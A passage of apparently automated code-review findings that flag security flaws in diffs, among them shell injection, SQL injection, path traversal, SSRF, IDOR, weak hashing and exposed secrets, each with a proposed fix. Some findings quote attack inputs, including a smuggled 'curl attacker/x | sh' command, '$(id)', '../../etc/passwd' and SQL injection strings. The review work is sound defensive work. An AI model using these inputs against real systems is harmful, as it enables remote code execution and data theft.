`content_type` comes straight from the client's `Content-Type` request header. After splitting on `;`, a conventionally formatted header (`multipart/form-data; boundary=----abc`) produces the field `" boundary=----abc"`; without `.strip()` the key is `" boundary"`, the `k == "boundary"` test on line 5 fails, `_parse_mime_body` is never called, and the request body is discarded with no error. Only a header written without the space (`multipart/form-data;boundary=...`) still parses.

That hands the client a switch: by choosing the whitespace in its own header it decides whether Tornado parses the body into arguments/files or ignores it entirely, while any intermediary (proxy, WAF, logging/inspection layer) that parses per RFC 7231 — where optional whitespace around parameters is allowed — still sees the fields. Any server-side check that inspects `request.arguments`/`request.files` then evaluates an empty body, so it fails open rather than rejecting. Independently, the trailing value is no longer trimmed, so a boundary can carry stray whitespace into `_parse_mime_body`.

Restore `field.strip().partition("=")` (and keep trimming `v`) so parameter parsing matches what conforming clients and intermediaries send.

findings.title: No test guards multipart boundary parsing against whitespace
findings.body: The diff removes .strip() from the field before partitioning on '=', so a Content-Type header like 'multipart/form-data; boundary=xyz' (space after ';') will produce k == ' boundary' instead of 'boundary', causing the boundary check to fail and multipart bodies to silently not be parsed. No test file is included in this change, so nothing exercises this code path with a realistic (space-separated) Content-Type header to catch this regression.

findings.title: Format placeholder left unsubstituted in LocationParseError message
findings.body:
The `%s` placeholder is no longer supplied with an argument, so the raised exception message is the literal string `"Failed to parse: %s"`. Callers and logs that surface this exception lose the offending URL entirely, making parse failures undiagnosable. Restore the interpolation: `raise LocationParseError("Failed to parse: %s" % url)`.

_Also raised by the docs agent:_ Error message contains unsubstituted format placeholder

findings.title: No test exercises the invalid-port LocationParseError path
findings.body: The diff removes the `url` argument from `"Failed to parse: %s" % url`, leaving a dangling `%s` placeholder with no argument. This will raise `TypeError: not enough arguments for format string` at runtime instead of the intended `LocationParseError` whenever a non-digit port is parsed. Nothing in this change (or apparently in the existing suite) calls the URL/port parser with a malformed port to trigger this branch, so this regression would go undetected.

findings.title: Command injection: shell=True with interpolated name/directory
findings.body:
`create_archive` formats `name` and `directory` directly into a shell string and executes it with `shell=True`. Any shell metacharacter in either argument escapes the intended `tar` invocation: e.g. `name = "x; curl attacker/x | sh; #"` or `directory = "/tmp $(id)"` runs arbitrary commands with the process's privileges. The same interpolation also allows path traversal out of `/exports` via `name = "../../etc/cron.d/x"`, letting the caller choose the write destination of the archive.

Fix: drop the shell entirely and pass an argument vector, matching the style already used by `list_exports` on line 5:

```python
output = os.path.join("/exports", f"{name}.tar.gz")
if os.path.dirname(os.path.realpath(output)) != "/exports":
    raise ValueError("invalid name")
return subprocess.run(["tar", "-czf", output, directory], check=True)
```

and validate `name` against a strict allowlist (e.g. `[A-Za-z0-9_-]+`) before use.

findings.title: Unquoted interpolation breaks for names/dirs with spaces or metacharacters
findings.body: `cmd = f"tar -czf /exports/{name}.tar.gz {directory}"` is passed to the shell unquoted. For a perfectly ordinary input such as `name="Q3 report"` or `directory="/srv/my data"`, the shell word-splits the arguments and tar receives `/exports/Q3` plus a stray `report.tar.gz` operand — the archive is written to the wrong path or the call fails with `CalledProcessError`. The same applies to any name containing `*`, `?`, `$`, `;`, backticks or quotes, which the shell will glob or re-interpret. Build the argument vector directly, matching the sibling function on line 5: `subprocess.run(["tar", "-czf", f"/exports/{name}.tar.gz", directory], check=True)`. If `name` may come from outside the process, also constrain it (e.g. reject path separators and `..`) so it cannot escape `/exports/`.

findings.title: No test coverage for create_archive's shell command construction
findings.body: create_archive builds a shell command string by interpolating `name` and `directory` and runs it with shell=True. There is no test in this diff verifying the command construction, escaping behavior, or that unexpected input (e.g. shell metacharacters) is handled as intended. Since the existing list_exports function uses a safer subprocess.run with an argument list, a test on create_archive would need to at least assert the resulting command/behavior for both normal and adversarial inputs, but nothing here does that.

findings.title: Public function `create_archive` lacks contract documentation
findings.body: The `create_archive(name, directory)` function is a new public API whose contract cannot be safely inferred from its name and signature. A caller would need to know: what the return value is, what exceptions it raises, what happens if `name` contains special characters or path traversal sequences, and whether `directory` can be relative or absolute. Without this, a competent caller could easily misuse it or be surprised by its behavior.

findings.title: dashboardCors allows any origin with credentials enabled
findings.body:
`dashboardCors` sets `origin: "*"` together with `credentials: true`, abandoning the `ALLOWED` allowlist that the existing middleware on lines 6-7 enforces. Any route mounted with this middleware accepts cross-origin requests from every site, and the credentials flag instructs the browser to attach the user's session cookies / Authorization header, so any page the victim visits can read authenticated dashboard responses.

Note the nuance: if this is the standard `cors` npm package, `origin: "*"` emits a literal `Access-Control-Allow-Origin: *`, which browsers refuse to honour for credentialed requests — the combination is silently broken rather than exploitable. If it is a wrapper that reflects the request `Origin` header (a very common pattern for supporting credentials), it is directly exploitable as universal CSRF-with-response-reading. Either way the configuration is wrong.

Fix: give the dashboard its own explicit origin allowlist (e.g. reuse or extend `ALLOWED`) and keep `credentials: true`, or drop `credentials` if the dashboard endpoints are genuinely public and unauthenticated.

findings.title: origin "*" with credentials:true is rejected by browsers
findings.body: With `origin: "*"` the `cors` middleware emits `Access-Control-Allow-Origin: *` alongside `Access-Control-Allow-Credentials: true`. The Fetch/CORS spec forbids the literal `*` on a credentialed request: the browser fails the check and the response is not exposed to the page, so any dashboard call made with `credentials: "include"` (or `withCredentials`) will error out instead of succeeding. If credentials are genuinely needed, the origin must be reflected from an allow-list (as the existing `ALLOWED` config on line 6 already does); if they are not needed, drop `credentials: true` so the wildcard actually works.

findings.title: Live AcmePay secret key hardcoded in source
findings.body:
`ACMEPAY_SECRET_KEY` is committed as a literal with an `acme_live_` prefix, and the previous `os.environ["ACMEPAY_SECRET_KEY"]` lookup was deleted. Anyone with read access to the repository (or to any clone, CI log, build artifact or container image) now holds a production payments credential, and it stays valid in git history even after the line is removed.

Restore the environment-variable lookup (or a secrets-manager fetch), and treat this key as compromised: rotate it at AcmePay now, then purge it from history. The `import os` removal should be reverted along with it.

findings.title: Per-environment key override removed; all envs now use one live key
findings.body: `client()` previously read `os.environ["ACMEPAY_SECRET_KEY"]` at call time, so staging, CI and production each supplied their own key and a missing variable raised `KeyError` immediately at startup. After this change the key is a module constant bound at import time, so every environment that imports `billing.acmepay_client` will authenticate against AcmePay with the same `acme_live_...` credential — including test and staging runs that previously could not reach the live API at all. There is also no longer any way for an operator to rotate or override the key without a code deploy. Restore the environment lookup (optionally with the literal removed entirely), e.g. `acmepay.api_key = os.environ["ACMEPAY_SECRET_KEY"]`, so deployment configuration continues to select the credential.

findings.title: client() behavior change has no asserting test
findings.body: client() now sets acmepay.api_key from the new module-level ACMEPAY_SECRET_KEY constant instead of os.environ. The only test-related addition in this PR is a fixture (tests/fixtures/acmepay.py) that defines fake_client() and TEST_KEY but is never invoked by an actual test that calls client() and asserts acmepay.api_key equals the expected value. If the wiring were reverted or broken (e.g. still reading from os.environ, or reading the wrong constant), nothing in this diff would fail.

findings.title: tenant_of trusts an unverified token, unlike claims_for
findings.body:
`tenant_of` decodes with `options={"verify_signature": False}` while the sibling `claims_for` on line 7 verifies with `public_key()` and RS256. The returned `tenant_id` is therefore whatever the caller put in the token payload — an attacker can mint an unsigned token with any `tenant_id` and this function will hand it back. In PyJWT 2.x, disabling signature verification also turns off the registered-claim checks (`exp`, `nbf`, `aud`) unless they are re-enabled explicitly, so expired tokens are accepted too. If the intent was to avoid a key lookup, derive the tenant from the already-verified claims (e.g. `claims_for(token)["tenant_id"]`, or pass the verified claims dict in) rather than re-decoding unverified.

_Also raised by the security agent:_ tenant_id read from JWT with signature verification disabled

findings.title: New tenant_of function has no test coverage
findings.body: tenant_of() decodes a JWT with signature verification disabled and trusts the tenant_id claim from an unverified token. No test exists to confirm this is intentional behavior or to catch a regression (e.g. if someone later expects this to be verified, or if a malformed/missing tenant_id claim should raise). Since this affects tenant isolation, a test asserting the current behavior (and its limits) would at least document and lock in the intended contract.

findings.title: Public function with undocumented security tradeoff
findings.body: The `tenant_of()` function intentionally disables JWT signature verification. This is a security-relevant design decision that a caller could easily get wrong — they might assume the token is validated, or might call this when they should call `claims_for()` instead. Add a docstring explaining why verification is skipped and when this function should be used.

findings.title: KeyError when the token carries no tenant_id claim
findings.body: `unverified["tenant_id"]` assumes the claim is always present. A well-formed token issued without `tenant_id` (older issuer, service token, or a token for a different audience) makes this raise `KeyError`, which callers are unlikely to be catching around an accessor named `tenant_of`. Either use `.get("tenant_id")` and let the caller handle `None`, or raise a domain-specific error that the callers can distinguish from a decode failure.

findings.title: Missing ownership check lets any user edit others' payment methods
findings.body:
`update_payment_method` calls `current_user(request)` (authentication only) and then fetches `PaymentMethod.get(pm_id)` using the caller-supplied `pm_id`, mutating `pm.billing_name` and persisting it with `pm.save()` — with no authorisation check. The retrieved `api/auth.py` documents `current_user` as "Authentication only — never authorisation" and states that `require_owner` must be called for "every object mutation". The read handler directly above (line 6) does call it; this new write handler does not.

Any authenticated user can enumerate or guess `pm_id` values and rewrite the billing name on payment methods belonging to other accounts (classic IDOR). Fix by inserting the check before mutating:

```python
user = current_user(request)
pm = PaymentMethod.get(pm_id)
require_owner(user, pm)
pm.billing_name = body["billing_name"]
```

Note also that `user` is currently bound on line 11 and never used, which is a strong hint the check was dropped. Separately, `body["billing_name"]` is unvalidated and will raise on a missing key — worth handling once the authz gap is closed.

_Also raised by the correctness agent:_ update_payment_method mutates object without require_owner check

_Also raised by the correctness agent:_ Unguarded body["billing_name"] raises KeyError on partial payload

findings.title: Public endpoint contract violated: missing ownership check
findings.body: The `update_payment_method` function is a public API endpoint that mutates a `PaymentMethod` object fetched by ID (line 12) without verifying ownership. The repository's own `auth.py` module documents that 'every object mutation must call [require_owner]' (auth.py line 7). The existing `get_payment_method` endpoint on line 6 already demonstrates this pattern. A caller reading this endpoint signature cannot know they will silently corrupt another user's payment method, and the documentation in the codebase's own auth module explicitly promises this check occurs on all mutations.

findings.title: No test coverage for new update_payment_method endpoint
findings.body: The new update_payment_method function is untested. It mutates a payment method fetched by id without calling require_owner (unlike the sibling read endpoint above it, which does call it). A test asserting that a non-owner user cannot update another user's payment method would have caught this missing authorization check; as written, nothing in the test suite would fail if this endpoint let any authenticated user modify any other user's saved payment method.

findings.title: Rate limit removed from password reset endpoint
findings.body: `request_reset` was previously throttled to 5 requests/hour by `@rate_limit("5/hour")`; the decorator and its `from limits import rate_limit` import are both deleted, so the handler now accepts unbounded requests. The `email` parameter is attacker-supplied and flows straight into `send_reset_email(email)` on line 2 with no throttling, which enables (a) mail-bombing an arbitrary victim address, (b) burning outbound mail quota / cost, and (c) high-volume probing if the response or timing differs for known vs. unknown accounts. Unless throttling has been moved to a gateway or middleware layer — which is not visible in this diff or in any retrieved context — restore the decorator or apply an equivalent per-IP and per-email limit.

findings.title: No test guards rate limiting on password reset endpoint
findings.body: The `@rate_limit("5/hour")` decorator was removed from `request_reset`, but the diff contains no test changes. If there previously was a test asserting the endpoint enforces a rate limit, it isn't shown here (and may have been silently dropped or never existed); if there wasn't one, this behavior change is completely uncovered and could regress again unnoticed. Add or verify a test that calls `request_reset` repeatedly and asserts requests beyond the limit are rejected.

findings.title: read_export_preview skips _confined, allowing arbitrary file reads
findings.body:
`read_export_preview` builds its path with `os.path.join(EXPORT_ROOT, name)` and opens it directly. Two reachable inputs escape the export root:

- `name = "../../etc/passwd"` — `os.path.join` does no normalisation, and `open` resolves the `..` segments, so the read lands outside `EXPORT_ROOT`.
- `name = "/etc/passwd"` — `os.path.join` discards the left operand entirely when the right operand is absolute, so `EXPORT_ROOT` is not even a prefix of the result.

The sibling handler immediately above uses `path = _confined(name)` for exactly this reason. Route the new function through the same helper: `path = _confined(name)` before `open(path, "rb")`, so both entry points share one containment check rather than one having it and one not.

_Also raised by the security agent:_ read_export_preview skips _confined(), allowing path traversal

findings.title: New read_export_preview function has no test coverage
findings.body: read_export_preview is new behavior (reads a file within EXPORT_ROOT with a size limit, and unlike the neighboring handler does not call _confined). No test exists in this diff to verify correct behavior (e.g., that it reads only up to `limit` bytes, or that it rejects paths outside EXPORT_ROOT). If the path confinement were removed or the limit logic broken, nothing in the current test suite would catch it.

findings.title: Public function missing contract on path safety
findings.body: The `read_export_preview` function takes a `name` parameter but provides no documentation about how it processes paths. Callers cannot determine from the function signature alone whether the path is confined to a safe directory (as `read_export` appears to do via `_confined`) or whether it accepts arbitrary paths. A competent caller could reasonably use this function unsafely without realizing it. Document the path-handling contract explicitly.

findings.title: bulk_export no longer enforces tenant ownership on exported reports
findings.body:
`bulk_export` fetches every `Report` named in the caller-supplied `report_ids` and serialises it, with no check that the reports belong to the requesting user's tenant. The retrieved docstring for `require_owner` states that "Every object read or mutation of another tenant's data must go through this" — this path now reads other tenants' data without it. Any authenticated user can enumerate or guess report IDs and receive full `to_dict()` payloads for another tenant.

A secondary signal that the control is simply gone rather than relocated: `user` is still computed on line 5 but is now unused within the function, and `require_owner` was dropped from the import on line 1, so no other call site in this file can be covering it.

If the motivation was performance, keep the check but make it cheap — e.g. fetch with a tenant-scoped query (`Report.get_many(report_ids, tenant_id=user.tenant_id)`) or do a single set comparison of `{r.tenant_id for r in reports}` against `user.tenant_id` — rather than removing the boundary. Note this also changes the function's contract: callers that relied on `Forbidden` propagating out of `bulk_export` will now silently receive data instead.

_Also raised by the security agent:_ Ownership check removed from bulk_export enables cross-tenant IDOR

findings.title: Public endpoint bulk_export now lacks enforced authorization
findings.body: The function `bulk_export` is a public endpoint (called from HTTP routing) that accepts report IDs and returns report data. The repository convention (demonstrated in api/auth.py) is that "every object read or mutation of another tenant's data must go through" the `require_owner` check. This check has been removed for performance, but the endpoint's contract is now undocumented: a caller (or future maintainer) cannot determine from the function signature alone whether cross-tenant access is allowed or forbidden. Either the authorization check must be restored, or the function must be explicitly documented as permitting cross-tenant access if that is intentional.

findings.title: No test guards against removal of ownership check in bulk_export
findings.body: bulk_export previously called require_owner(user, report) for each report before returning data; that call has been deleted. There is no test file in this diff, so if a test suite exists that exercises bulk_export with a cross-tenant report, it would need to already assert a Forbidden/exception is raised for unauthorized access — otherwise this regression (or any future reintroduction of the check) would go undetected. Since no test changes accompany this behavioral change, nothing in the given diff would catch that reports from another tenant are now returned instead of raising Forbidden.

findings.title: SQL injection via f-string interpolation in search_customers
findings.body:
`search_customers` interpolates `term` and `status` straight into the SQL string and calls `execute(sql)` with no parameter tuple, so the values are parsed by the database as SQL. Both are inside single quotes, so a value containing `'` breaks out of the literal: e.g. `status = "x' OR '1'='1"` returns every customer row, and `term = "%' UNION SELECT ... --"` allows arbitrary reads from any table the billing DB user can reach. Depending on driver and cursor settings, stacked statements could allow writes.

Fix by parameterising, matching `get_customer` on line 5 and the contract in `billing/db.py` ("`params` must carry every caller value"). Build the LIKE wildcards in Python, not in the SQL text:

```python
def search_customers(term, status):
    sql = "SELECT * FROM customers WHERE name LIKE %s AND status = %s"
    return execute(sql, (f"%{term}%", status))
```

If `status` is meant to be one of a fixed set, also validate it against an allowlist.

findings.title: search_customers bypasses execute()'s parameter contract
findings.body:
`billing.db.execute` is documented as "Run a parameterised query. `params` must carry every caller value." Here the two caller values (`term`, `status`) are interpolated directly into the SQL text on line 9 and `execute` is invoked on line 10 with `params` omitted, so the contract the helper exists to enforce is not met — unlike `get_customer` on line 5, which passes `(customer_id,)`.

Beyond the injection exposure, this is a plain correctness defect for ordinary inputs: any `term` or `status` containing an apostrophe (`O'Brien`) terminates the quoted literal and the query fails or silently matches the wrong rows, and a `term` containing `%` or `_` is treated as a LIKE wildcard rather than a literal.

Fix by keeping the wildcards out of the interpolated text and passing values through `params`:

```python
def search_customers(term, status):
    sql = "SELECT * FROM customers WHERE name LIKE %s AND status = %s"
    return execute(sql, (f"%{term}%", status))
```

(If literal `%`/`_` in `term` should not act as wildcards, escape them before building the pattern.)

findings.title: No test exercises search_customers
findings.body: The new search_customers function builds SQL via f-string interpolation with no test verifying its query construction or behavior with any input (including malicious ones). Nothing in this diff would catch a regression here, nor would it catch the eventual fix being reverted.

findings.title: Public function lacks parameter and return documentation
findings.body: `search_customers` is a new public function that accepts parameters and returns a result, but carries no docstring explaining what `term` and `status` are, what they are matched against, or what the return value contains. A caller cannot work out the contract from the name and signature alone — specifically, whether `term` is a substring match or an exact match, or whether the return format matches `get_customer`.

findings.title: verify_endpoint skips the ALLOWED_HOSTS check enforced by the sibling sender
findings.body:
The function immediately above resolves the destination host and rejects anything outside `ALLOWED_HOSTS` before issuing the request (lines 8-10). `verify_endpoint` takes a caller-supplied `url` and passes it straight to `requests.get` with no host or scheme validation, so the module invariant that outbound requests only reach approved destinations no longer holds for this code path. A caller can point it at internal addresses (link-local metadata, loopback admin ports) or non-HTTP schemes, and the returned status code leaks whether the target exists. Apply the same host check used at line 8 before the request, restrict the scheme to http/https, and pass `allow_redirects=False` — otherwise a permitted host can 302 the client onto an internal target and defeat the check anyway.

_Also raised by the security agent:_ SSRF: verify_endpoint fetches arbitrary URL, skipping ALLOWED_HOSTS check

findings.title: verify_endpoint has no test and skips the allowlist check used elsewhere
findings.body: verify_endpoint issues a GET to a caller-supplied URL with no test exercising it. If it were wrong — e.g. it should validate the host against ALLOWED_HOSTS the way the existing post-based function does (lines 8-9), or should not follow redirects, or should restrict schemes — nothing in the diff would catch that. There's no test asserting the function raises on a disallowed host, restricts scheme, or returns an expected status code for a valid target.

findings.title: verify_endpoint raises instead of reporting unreachable endpoints
findings.body: The evident purpose of `verify_endpoint` is to report whether a registered target is reachable, and its return shape (an int status code) suggests callers will branch on it. But `requests.get` raises `ConnectionError`, `Timeout`, `TooManyRedirects` or `MissingSchema` for exactly the failure modes verification exists to detect, so an unreachable or malformed URL propagates an exception rather than yielding a result. Either catch `requests.RequestException` and return a sentinel (e.g. `None`), or document that callers must handle the exception.

findings.title: Public function `verify_endpoint` lacks documentation
findings.body: The function `verify_endpoint` appears to be a public API (it follows the naming convention of the existing `send_webhook` function in the same module and has no leading underscore). Callers cannot determine its contract from the name and signature alone: does it validate that a URL is reachable? Does it check that the endpoint is allowed? What does the returned status code mean in context? Add a docstring explaining the function's purpose, parameters, return value, and any exceptions it raises.

findings.title: Public access block disabled on customer invoices bucket
findings.body:
`aws_s3_bucket_public_access_block.invoices` sets `block_public_acls`, `block_public_policy`, `ignore_public_acls` and `restrict_public_buckets` all to `false`. This is the account-level guardrail that stops an S3 bucket from ever being made world-readable; with it off, any bucket policy or object ACL — added deliberately, by a misconfigured deploy, or by anyone with `s3:PutBucketPolicy`/`s3:PutObjectAcl` on this bucket — immediately exposes `acme-customer-invoices` to anonymous readers on the internet. The bucket name indicates customer billing data (PII, amounts, addresses).

The PR description states only the assets bucket is deliberately public, so this block appears to be copy-pasted from the `assets` resource above. Set all four flags to `true` for `invoices`, or delete this resource entirely so the account-level block applies. If the bucket genuinely holds customer data, also consider adding `aws_s3_bucket_server_side_encryption_configuration` and versioning.

_Also raised by the correctness agent:_ Invoices bucket public access block disables all protections

findings.title: Undocumented public access configuration on invoices bucket
findings.body: The invoices bucket is configured with public access blocks all set to false (lines 19-22), which allows public access. This is unexpected for a resource named 'invoices' and containing customer data. Either: (1) add a comment explaining why this bucket must be public, or (2) verify this configuration is intentional and not a copy-paste error from the assets bucket. The assets bucket has the same configuration and is explicitly described as public in the PR title, but invoices should typically be private.

findings.title: verify_acmepay compares HMAC with == instead of compare_digest
findings.body:
`verify_acmepay` computes the same hex-digest HMAC as `verify_stripe` one function above, but returns `expected == header` rather than `hmac.compare_digest(expected, header)`. `==` on Python `str` short-circuits at the first differing byte, so the comparison time leaks the length of the matching prefix; an attacker who can submit repeated webhook deliveries can recover a valid signature byte by byte without knowing `secret`. Replace line 12 with `return hmac.compare_digest(expected, header)` to match line 7.

Secondary, same line: the two functions also diverge on a non-string `header`. `compare_digest` raises `TypeError` when `header` is `None`, while `==` quietly returns `False`. Any caller that today relies on the stripe path raising to distinguish "missing header" from "bad signature" will get a different outcome from the acmepay path; switching to `compare_digest` removes the divergence, or explicitly validate `header` first in both.

_Also raised by the security agent:_ Webhook signature compared with `==` instead of compare_digest

findings.title: New verify_acmepay function has no test coverage
findings.body: The new verify_acmepay function is untested. No test file appears in this diff, so if this function's comparison logic is wrong (e.g. timing-unsafe or incorrect equality check), nothing in the suite would catch it. Add tests exercising both matching and mismatching signatures for this function.

findings.title: Exception message and traceback returned to the client
findings.body:
`handle()` previously returned a fixed `{"error": "internal error"}` body; it now serialises `str(exc)` and `traceback.format_exc()` into the 500 response. Anything that reaches this handler — a failed DB call, a file operation, a deserialisation error — will disclose source file paths, module and function names, line numbers, local framework versions, and often fragments of queries or connection strings embedded in the exception message. That is a free map of the application's internals for anyone who can trigger an error, and error triggering is usually cheap (malformed input, oversized payload, unexpected content type).

Keep the generic body for the client and rely on the existing `log.exception("request failed")` for operators. If callers need to correlate, mint a random correlation id, log it alongside the traceback, and return only that id:

```python
error_id = uuid.uuid4().hex
log.exception("request failed", extra={"error_id": error_id})
return {"error": "internal error", "error_id": error_id}, 500
```

If verbose output is genuinely wanted for local work, gate it behind an explicit debug flag that defaults to off in production rather than making it the unconditional behaviour.

_Also raised by the correctness agent:_ traceback.format_exc() ignores `exc` and depends on ambient exception state

_Also raised by the correctness agent:_ Error response shape changed: new key and non-constant `error` value

findings.title: No test guards error response contents from handle()
findings.body: handle() now returns the raw exception string and a full traceback in the client-facing response body instead of a generic message. There is no test in this diff (or referenced) that asserts what handle() returns, so this security/behavior-relevant change could be reverted or altered further with nothing failing.

findings.title: Reset passwords hashed with unsalted MD5 instead of bcrypt
findings.body: `hash_reset_password` derives a stored credential with a single unsalted MD5 pass. MD5 is a fast, GPU-friendly hash with no work factor and no per-user salt: an attacker who obtains the credential store can recover these passwords at billions of guesses per second, and identical passwords across users produce identical digests (enabling trivial cross-account correlation and rainbow-table lookups). The module already does the right thing one function above \u2014 `hash_password` uses `bcrypt.hashpw(raw.encode(), bcrypt.gensalt())`. Reuse it: `def hash_reset_password(raw): return hash_password(raw)`. If the value is actually a short-lived reset *token* rather than a password, it should still be a high-entropy random token compared with `hmac.compare_digest`, not an MD5 of user input. The SHA-256 use in `checksum` is appropriate and not a concern.

findings.title: hash_reset_password returns a hash format bcrypt verification cannot check
findings.body:
`hash_password` (line 7) stores a bcrypt modular-crypt string (`$2b$...`), while the new `hash_reset_password` stores a bare 32-char MD5 hex digest. If both values land in the same password column, whatever verifies logins — presumably `bcrypt.checkpw`/`bcrypt.hashpw` against the stored value — will not validate an MD5 digest: bcrypt treats the stored string as a salt+hash and will either raise on the malformed salt or simply never match. The result is that any account that goes through the reset path becomes unlockable-out, silently, until someone resets again through the other path.

Either make the reset path call `hash_password` so the stored format is uniform, or introduce an explicit algorithm tag and a verifier that dispatches on it. (Separately, MD5 is not an acceptable password KDF at all — unsalted and trivially brute-forced; that alone argues for reusing `hash_password`.)

findings.title: No test coverage for hash_reset_password
findings.body: hash_reset_password is a new function added on the password reset path but no test file is present in this diff to exercise it. Nothing would catch a change to its hashing behaviour (e.g. swapping algorithms, changing encoding, or breaking on non-ascii input). Given this touches password handling, it should have at least a basic test asserting deterministic output and expected hex digest length/format.

findings.title: Public function `hash_reset_password` lacks documentation
findings.body: The function `hash_reset_password` is a public API (appears to be part of the auth module's exported interface) but has no docstring. A caller would need to infer from the name alone what it does, what it expects as input, and what it returns. The name suggests password hashing, but the implementation differs significantly from `hash_password` in a way that is not self-evident.

findings.title: Public function `checksum` lacks documentation
findings.body: The function `checksum` is a public API but has no docstring explaining its purpose, expected input (file path as string?), or return value (hex digest of what algorithm?). The name alone does not clarify which hashing algorithm is used or what the intended use case is.

findings.title: pull_request_target executes fork-controlled code with repo secrets
findings.body:
`pull_request_target` runs in the context of the base repository: it has access to `secrets.*` and a `GITHUB_TOKEN` with write permissions, and it needs no maintainer approval for first-time contributors.
